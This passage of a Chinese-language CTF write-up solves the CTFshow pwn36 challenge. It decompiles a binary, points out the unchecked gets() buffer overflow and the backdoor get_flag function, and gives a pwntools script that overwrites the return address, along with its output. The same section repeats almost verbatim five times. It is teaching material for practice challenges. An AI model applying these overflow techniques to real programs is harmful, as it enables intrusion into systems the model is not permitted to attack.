<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-17"><a href="#pwn36-17" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./pwn&#x27;: pid 872</span><br><span class="line">[*] &#x27;/CTFshow_pwn/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor functions here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-18"><a href="#pwn36-18" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn36-19"><a href="#pwn36-19" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-20"><a href="#pwn36-20" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>





<h2 id="pwn36-21"><a href="#pwn36-21" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
